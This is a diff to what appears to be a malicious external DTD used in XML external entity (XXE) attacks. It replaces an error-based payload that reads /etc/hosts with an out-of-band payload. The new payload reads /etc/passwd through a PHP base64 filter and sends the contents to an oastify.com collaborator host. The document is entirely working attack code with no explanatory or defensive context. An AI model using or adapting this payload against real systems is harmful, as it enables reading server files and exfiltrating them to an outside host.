@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/hosts">
-<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://w85319u92lbpuwhyu1d5p5svkmqded22.oastify.com/?content=%file;'>">
